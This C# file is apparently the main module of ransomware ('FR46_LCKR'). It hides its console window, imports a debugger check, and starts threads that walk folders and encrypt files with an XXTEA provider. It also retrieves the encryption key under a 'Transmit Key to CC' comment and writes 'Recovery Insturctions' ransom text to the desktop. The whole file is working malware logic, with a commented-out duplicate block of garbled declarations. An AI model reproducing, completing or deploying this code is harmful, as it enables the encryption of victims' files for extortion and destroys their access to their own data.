using System;
using System.IO;
using FR46_LCKR.CLASS;
using FR46_LCKR.Interface;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace FR46_LCKR
{
    internal class WStuff
    {
        /*
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        [DllImport("kernel32.dll")] private static extern IntPtr g_CMD();
        [DllImport("user.32.dll")] private static extern bool S_window(IntPtr hWnd, int nCmdshw);
        private const int sw_hde = 0;
        private const int sw_shw = 5;
        // Hide command shell while invoking win32 API

        public class DummyParser : IFil_Parsr
        {
            public void Par_File(string fPath)
            {
                System.Threading.Thread.Sleep(1);
                Console.WriteLine("Parsing Files");
            }
        
         {
        */
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        public class DummyParser : IFil_Parsr
        {
            public void Par_File(string fPath)
            {
                System.Threading.Thread.Sleep(1);
                Console.WriteLine("Parsing files");
            }
        }
        
        /*
        * 
        * 
        * 
        * 
        */
        public static void Main(string[] args)
        {
            System.Threading.Thread.Sleep(1);
            var hand = GetConsoleWindow();
            //Hide shell
            ShowWindow(hand, SW_HIDE);

            IFil_Crypt fil_Crypt = new XXteaE_Provider();
            IFil_Parsr fil_Parsr = new Fil_Parsr(fil_Crypt);
            //Dummy Parser Function
            // IFil_Parsr fil_Parser = new DummyParser();
            IFil_ext fil_Ext = new Fil_ext();

            IDrv_Enum drv_Enum = new Foldr_Browser();            // Go into Drv_Enum

            var startFoldrs = drv_Enum.StartFolder();
            var encrypt_Thread = GEncrypt_Thread(startFoldrs, new Dir_Walkr(fil_Ext, fil_Parsr));
            encrypt_Thread.ForEach(encThread =>
            {
                encThread.Start();
            });

            //Transmit Key to CC

            var encryptionKey = fil_Crypt.GetEncryptionKey();

            var recoveryBytes = Convert.FromBase64String("");
            var recoveryMessage = System.Text.Encoding.UTF8.GetString(recoveryBytes);

            var motd_Wrtr = new Motd_Wrtr(recoveryMessage, "Recovery Insturctions", 10);
            motd_Wrtr.WMOTD_Desktop();

            encrypt_Thread.ForEach(encThread =>
            {
                if (encThread != null) encThread.Join();
            });
        }

        private static List<Thread> GEncrypt_Thread(List<string> startFoldrs, Dir_Walkr directoryWalkr)
        {
            var encrypt_Thread = new List<Thread>();
            foreach (var foldr in startFoldrs)
            {
                encrypt_Thread.Add(new Thread(() => directoryWalkr.Trav_Dir(foldr)));
            }
            return encrypt_Thread;
        }
    }
}
